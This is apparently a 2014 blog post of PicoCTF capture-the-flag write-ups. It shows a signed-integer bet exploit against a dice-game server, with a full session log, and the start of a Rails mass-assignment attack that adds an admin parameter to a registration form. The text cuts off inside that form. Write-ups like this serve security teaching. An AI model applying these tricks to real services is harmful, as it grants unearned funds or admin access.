
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>PicoCTF Write-Ups - staring into /dev/null</title>
  <meta name="author" content="barrebas">

  
  <meta name="description" content="We managed to grab all of PicoCTF the flags and we ended with a 6105 point total score! Here are writeups of bitpuzzle, crudecrypt, low_entropy, &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">staring into /dev/null</a></h1>
  
    <h2>barrebas</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:barrebas.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">PicoCTF Write-Ups</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-11-06T22:52:14+01:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>6</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:52 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>We managed to grab <em>all</em> of PicoCTF the flags and we ended with a 6105 point total score! Here are writeups of bitpuzzle, crudecrypt, low_entropy, makeaface, massive_fail, netsino, nevernote, no_overflow, obfuscation and web-interception. Lots of binary exploitation, reverse engineering and even some crypto!</p>

<!--more-->


<h1>Netsino (120 points)</h1>

<p><code>
Daedalus seems to have ties to a shady online gambling boss. Maybe if
you beat him at his own game, you can persuade him to share some useful
info. The server is running on vuln2014.picoctf.com:4547 and the source
code can be found here.
</code></p>

<p>We are presented with an online gambling program. You randomly get some cash and have to gamble against the boss. The following code takes your betsize:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">long</span> <span class="nf">getbet</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You&#39;ve got $%lu. How much you wanna bet on this next toss?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">player_cash</span><span class="p">);</span>
</span><span class='line'>        <span class="kt">long</span> <span class="n">bet</span> <span class="o">=</span> <span class="n">getnum</span><span class="p">();</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">bet</span> <span class="o">&lt;=</span> <span class="n">player_cash</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">bet</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Yerr can&#39;t bet more than ya got!&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The object is to win all the boss&#8217; money, so he&rsquo;ll give you the flag. Unfortunately, the program is coded pretty securely. Furthermore, the odds of winning aren&rsquo;t favorable. Luckily for us, the program makes a mistake when reading in the betsize. If we supply a large enough value, then the number being read will be negative. The program does not check for this. So let&rsquo;s supply <code>0xf0000000</code>, which is 4026531840. For the c program, however, it will be a negative number. Thus, the betsize check will pass, because -268435445 is less than your total amount. Next, all we have to do is lose:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">play</span><span class="p">(</span><span class="kt">long</span> <span class="n">choice</span><span class="p">,</span> <span class="kt">long</span> <span class="n">bet</span><span class="p">,</span> <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="c1">//...snip...</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">5</span><span class="o">:</span> <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">y</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">player_cash</span> <span class="o">+=</span> <span class="mi">36</span><span class="o">*</span><span class="n">bet</span><span class="p">;</span>
</span><span class='line'>                <span class="n">boss_cash</span> <span class="o">-=</span> <span class="mi">36</span><span class="o">*</span><span class="n">bet</span><span class="p">;</span>
</span><span class='line'>                <span class="n">puts</span><span class="p">(</span><span class="n">wins</span><span class="p">[</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">3</span><span class="o">+</span><span class="mi">7</span><span class="p">]);</span>
</span><span class='line'>            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">puts</span><span class="p">(</span><span class="n">loses</span><span class="p">[</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">3</span><span class="o">+</span><span class="mi">7</span><span class="p">]);</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By betting on snake-eyes (a very slim chance of that happening), the program will subtract the betsize times 36 from our cash and add that same amount to the boss&#8217; money. However, we supplied a very large negative number for the betsize, meaning that we actually <em>get</em> money and the boss loses money. Rinse &amp; repeat this a couple of times to get the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">nc</span> <span class="n">vuln2014</span><span class="p">.</span><span class="n">picoctf</span><span class="p">.</span><span class="n">com</span> <span class="mi">4547</span>
</span><span class='line'><span class="n">Arr</span><span class="p">,</span> <span class="n">git</span> <span class="n">ye</span> <span class="n">into</span> <span class="n">me</span> <span class="n">casio</span><span class="p">,</span> <span class="n">the</span> <span class="n">hottest</span> <span class="n">gamblin</span><span class="err">&#39;</span> <span class="n">sensation</span> <span class="n">on</span> <span class="n">the</span> <span class="n">net</span><span class="o">!</span>
</span><span class='line'><span class="n">Here</span><span class="p">,</span> <span class="n">have</span> <span class="n">a</span> <span class="n">fiver</span><span class="p">,</span> <span class="n">and</span> <span class="n">let</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">gamble</span><span class="o">!</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">5.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">5</span> <span class="mi">3</span>
</span><span class='line'><span class="n">Snake</span> <span class="n">eyes</span><span class="o">!</span> <span class="p">...</span><span class="n">not</span><span class="p">.</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">268435461.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">5</span> <span class="mi">4</span>
</span><span class='line'><span class="n">You</span> <span class="n">seem</span> <span class="n">to</span> <span class="n">enjoy</span> <span class="n">loosing</span><span class="p">.</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">536870917.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">2</span> <span class="mi">1</span>
</span><span class='line'><span class="n">Snake</span> <span class="n">eyes</span><span class="o">!</span> <span class="p">...</span><span class="n">not</span><span class="p">.</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">805306373.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">4</span> <span class="mi">3</span>
</span><span class='line'><span class="n">Like</span> <span class="n">that</span> <span class="n">was</span> <span class="n">ever</span> <span class="n">gonna</span> <span class="n">happen</span><span class="p">.</span>
</span><span class='line'><span class="n">Great</span><span class="p">,</span> <span class="n">I</span><span class="err">&#39;</span><span class="n">m</span> <span class="n">fresh</span> <span class="n">outta</span> <span class="n">cash</span><span class="p">.</span> <span class="n">Take</span> <span class="n">this</span> <span class="n">flag</span> <span class="n">instead</span><span class="p">.</span>
</span><span class='line'><span class="n">i_wish_real_casinos_had_this_bug</span>
</span><span class='line'><span class="n">Git</span> <span class="n">outta</span> <span class="n">here</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<h1>Massive Fail (120 points)</h1>

<p><code>Fed up with their recent PHP related issues, Daedalus Corp. has switched their website to run on Ruby on Rails (version 3.1.0) instead. Their brand new registration page does not seem like much of an improvement though... [Source].</code></p>

<p>We&rsquo;re given the source to a Ruby on Rails website. We need to register as an admin to get the flag. The interesting bit is in <code>db/schema.rb</code> and <code>app/controller/user_controller.rb</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">ActiveRecord</span><span class="o">::</span><span class="n">Schema</span><span class="p">.</span><span class="n">define</span><span class="p">(</span><span class="o">:</span><span class="n">version</span> <span class="o">=&gt;</span> <span class="mi">20141008175655</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">create_table</span> <span class="s">&quot;users&quot;</span><span class="p">,</span> <span class="o">:</span><span class="n">force</span> <span class="o">=&gt;</span> <span class="nb">true</span> <span class="k">do</span> <span class="o">|</span><span class="n">t</span><span class="o">|</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">string</span>   <span class="s">&quot;username&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">string</span>   <span class="s">&quot;password&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">string</span>   <span class="s">&quot;name&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">boolean</span>  <span class="s">&quot;is_admin&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">datetime</span> <span class="s">&quot;created_at&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">datetime</span> <span class="s">&quot;updated_at&quot;</span>
</span><span class='line'>  <span class="n">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">class</span> <span class="n">UserController</span> <span class="o">&lt;</span> <span class="n">ApplicationController</span>
</span><span class='line'>  <span class="n">def</span> <span class="k">register</span>
</span><span class='line'>  <span class="n">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">def</span> <span class="n">create</span>
</span><span class='line'>    <span class="cp"># User.new creates a new user according to ALL the parameters</span>
</span><span class='line'>    <span class="err">@</span><span class="n">new_user</span> <span class="o">=</span> <span class="n">User</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="o">:</span><span class="n">user</span><span class="p">])</span>
</span><span class='line'>    <span class="err">@</span><span class="n">new_user</span><span class="p">.</span><span class="n">save</span>
</span><span class='line'>  <span class="n">end</span>
</span><span class='line'><span class="n">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>The application registers the user using <em>ALL</em> supplied parameters. So let&rsquo;s supply a few more, shall we? Download the registration page and &ldquo;tweak&rdquo; it a bit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">accept-charset=</span><span class="s">&quot;UTF-8&quot;</span> <span class="na">action=</span><span class="s">&quot;http://web2014.picoctf.com:5000/user/create&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;&lt;div</span> <span class="na">style=</span><span class="s">&quot;margin:0;padding:0;display:inline&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">name=</span><span class="s">&quot;utf8&quot;</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">value=</span><span class="s">&quot;&amp;#x2713;&quot;</span> <span class="nt">/&gt;&lt;input</span> <span class="na">name=</span><span class="s">&quot;authenticity_token&quot;</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">value=</span><span class="s">&quot;+yYhUookKb5lZuf2bU97ccd3TWYizvaxFYpWfR5H/b8=&quot;</span> <span class="nt">/&gt;&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_name&quot;</span><span class="nt">&gt;</span>Name<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_name&quot;</span> <span class="na">name=</span><span class="s">&quot;user[name]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
